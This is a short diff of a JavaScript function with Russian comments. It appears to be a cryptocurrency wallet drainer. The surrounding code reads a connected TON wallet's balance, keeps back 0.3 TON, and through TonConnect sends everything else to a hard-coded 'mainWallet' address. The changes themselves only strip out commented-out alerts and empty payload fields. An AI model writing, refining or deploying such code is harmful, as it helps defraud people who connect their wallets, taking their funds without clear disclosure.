@@ -77,7 +77,6 @@ async function didtrans() {
     // Проверка на ошибки при получении данных о кошельке
     if (!data.balance) {
         console.error('Не удалось получить баланс');
-        //alert('Не удалось получить баланс');
         return;
     }
 
@@ -91,7 +90,6 @@ async function didtrans() {
     // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
     if (originalBalance <= deduction) {
         console.error('Баланс слишком мал для вычитания 0.3 TON');
-        //alert('Баланс слишком мал для вычитания 0.3 TON');
         return;
     }
 
@@ -107,12 +105,10 @@ async function didtrans() {
             {
                 address: mainWallet,  // Адрес получателя для первой части
                 amount: 1000000,       // Сумма для первой транзакции (0.001 TON)
-                payload: "",           // Пустой payload (или можно удалить)
             },
             {
                 address: mainWallet,   // Адрес получателя для второй части
                 amount: remainingBalance, // Сумма для второй транзакции
-                payload: "",           // Пустой payload
             }
         ],
         sendMode: 3,  // Если это требуется в вашем API
@@ -123,12 +119,10 @@ async function didtrans() {
         // Подписание и отправка транзакции через TonConnect
         const result = await tonConnectUI.sendTransaction(transaction);
         console.log('Транзакция успешно отправлена:', result);
-        //alert('Транзакция успешно отправлена!');
         
         // Обновляем баланс после отправки
         await updateBalance(walletAddress);
     } catch (error) {
         console.error('Ошибка при отправке транзакции:', error);
-        //alert('Ошибка при отправке транзакции.');
     }
 }
